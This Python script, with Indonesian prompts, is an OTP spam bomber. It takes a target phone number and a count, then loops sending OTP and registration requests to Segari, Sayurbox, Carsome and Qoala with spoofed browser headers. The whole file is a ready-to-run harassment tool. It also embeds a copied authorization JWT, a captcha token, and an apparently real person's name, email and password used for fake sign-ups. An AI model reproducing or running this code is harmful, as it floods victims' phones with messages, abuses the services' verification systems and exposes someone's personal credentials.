import os,sys,time
import requests
import json
import re
import colorama
from requests import post,get
from colorama import Fore,init,Back

# Warna dari Modules Colorama
B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

# Warna Default
Hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"

nomer = input(f"{W}[{R}?{W}] Masukkan Nomor Target {Y}:{G} ")
jumlah = int(input(f"{W}[{R}?{W}] Masukkan Jumlah Spam {Y}:{G} "))
for i in range(int(jumlah)):
    pos=requests.post("https://api-v2.segari.id//v1/otps/generate",headers={"Host":"api-v2.segari.id","content-length":"30","accept":"application/json, text/plain, */*","x-segari-platform":"web","origin":"https://segari.id","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","referer":"https://segari.id/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":nomer})).text
    sayur=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host': 'www.sayurbox.com','content-length': '289','authorization': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY3NTM3OTE3LCJleHAiOjE2NzAxMjk5MTcsImlhdCI6MTY2NzUzNzkxNywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijc1ZTBlYzhjLWJkNDEtNGFjNy04OWFmLTdiMjkyOWRmYWIzNyIsInN1YiI6IjJFd2xtbjM1dHZ0ejdQZ1NQU05nSndkdEdSenoiLCJ1c2VyX2lkIjoiMkV3bG1uMzV0dnR6N1BnU1BTTmdKd2R0R1J6eiJ9.FeTawVAcqeWQSRoC6eki_jqwykO-uKuSSWzcEKC8dGJYfbXdwzTbK6gPvloXuI16RzH-jvtIiMghKwP4S6-M0JHwLI8feMA5UGIPQsnUiOR9LpqqV-2kybWvVNsU1DrsdHRbTyVZBFdwwwGVlqMGBM25gH30GAzDI7Hp6g-MvCwPH9KTC4xvD5vQkdJHFa9q42sxWDVz9TkzJ09fCgPX4ZdEONJ3c_63BvLwzVLb24t7ivjhcMJBkWvHNsZ5FsSxXyUB8sCGEA7ify4q2iV2cfnRklcTx2r20MFLOGsPBK0uGFUsbXdctJXC-WtM3jddwmDt0fX1CfToA0x4PL3Hhw','content-type': 'application/json','accept': '*/*','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','x-bundle-revision': '14.2','x-sbox-tenant': 'sayurbox','x-binary-version': '2.4.1','origin': 'https://www.sayurbox.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomer},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])).text
    casrome=requests.post("https://www.carsome.id/website/login/sendSMS",headers={'Host': 'www.carsome.id','content-length': '38','accept': 'application/json, text/plain, */*','x-language': 'id','x-token': '','country': 'ID','x-amplitude-device-id': 'QbOr1g4RMMMIpnkg7JVqx7','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','content-type': 'application/json','origin': 'https://www.carsome.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.carsome.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"username":nomer,"optType":1})).text
    qoala=requests.post("https://api.qoala.app/api/registrations",headers={"Host":"api.qoala.app","content-length":"208","accept":"application/json, text/plain, */*","origin":"https://www.qoala.app","x-captcha-token":"03AFY_a8VtsAystGxBxnF2f3S4g-gjK6uVGQIJyuAvoKXZomQQp3mfJ08gUijh8Z9REUAz0BekAGkvUPsdxyJEP_r24a0K39M2DWTyEBSrzdGjWPEm7kJoe4gLwV_uM4YWqDw2giaVR6Qte3HXGeacrsXvQOOyGjr8hsX4IOCwqUtiLBk_T8K8GVFHC_QZL7ckNNecRfUu48lN14c8-Gi6ioMdF7gb8mFnJrMM7Kd-H17QMt_y6VxeP4oxJ5YTDsIsND8YTrltqD_f6Izvdgb5yg0FEvCd4olgEv_BkNIv_H2W8ixYCn8XbyljJHHMFMHuO1Ft6DPDMTrmMe4rF0ilcAe4ZrefKJZeuPWbTGeTEekBVScO3GEYf9e5DuRWZTy0ptbn-5r1mJOkOlsz3vqRhQBFbMT4uTY01OkFv0wSqJmsFpqVkhhiDUj7Knm0h0ynHil7F2NynOF2tQeMFJn4t_YUbI2PGiBMHE1yeKy5ZYcgk88f0UsoEeWdqgGUGFNxCCRaMOE9ZgOYS9wJf9WlHQm1Rf5Jwqi1zu4EO53Zp652HbeFtYf-R_6AZvKuhMTjPvmV8FC42X43SCAbXxDvAcG-FvCUZTzM9PjOAwhSQ_T2pEAsGujK5MvdPqk6FIjLw2VKEXJQmvHhmNb4_C9DF0mlStBDFQFysc99g-ey2DbuMlWeiYeELTUH5K5l-LHFYlMct-cz5c_KpUlnVePDXQZ_HiLHxsMj_aDKGquhTLBThhkvuaPh2Lxadi5qmf11UlepL-TGuYY0h3HvZZ3WnKoUZQWpRHIabyEyLTu5sugmZ22uTyiC49ah6C4KXSnxGgYvrLNsQRpps6-xbaA3JL19kJK0ObPnEZSJs4h8HzH1jWVLvmS1BGZ8tVGPYI1Y3Z5scNf94nGPW6HDCgumrWNhYWVMqQB3X7bPXahGoO-vv-Bw_GomsT5TQYvU3Pk-ovbTTpAho36lG7vpuOFwfAwToGTyJBNlEQYCDzRMMUr6uO8vnHUqdFR40L-BfxvvCqKEReZXd709XosDmCvC4KDFVBJx62eSClCkR1_iek8f9KmFD0XAjs8C8tZKlOWp4sOrTh199cTW6hg8opUTPg17znjm6BPHWQ0dRKrav-JJQzzTZi1BiHvjJ-KvYLDplcVVVEZZk-hpmRILgSxv6ShIfxuFSxig8y44M0KpbdoB1Q9Pho2gLfJbv2cGqZQkwM-TWk__tI7c1IuQtaWg2iIe5D-AM_1vyURlyKOR3KYS21mkBAM0gdQS6m3z3ewvueMa7tdYM3sNQGMkh8npAju87t7wCMqjFjjp8grOs2SQ7wxJkTlu7XbI89e2kcb4MtJRF_Taj6LtN1Y_CKMVMUw32H1Vj72bxs6KPzilbYAbrZASBSk8-yunwHPdPc5SC58VBl7CVUI96-I-oQd-i-ek_2Sb8sVdSYW7FO5LArz3W8yvw1-Ymurux8xnvJRbPSTc5dQSk9_oiI4XA2pgO2jzvsDMLgPSTZosgqm-iaeREVGudOe9nSgmyVrr747WVwlXkAk04UIlDCIX2zRbr4Y51HWUjRxJ1WGcCGmeMq4XQPepMDkzcmoJpzle3peJYFVWn8JZ66Y0muo_ddBW0AjY-EgIbdlmEQ","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","referer":"https://www.qoala.app/id/sessions/register","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"fullName":"Muhamad Tsaqif","email":"tsaqipmuhamad@gmail.com","phoneNumber":"+62"+nomer,"identityType":"KTP","nationality":"ID","password":"Udingans23@","passwordConfirmation":"Udingans23@","lang":"id"})).text

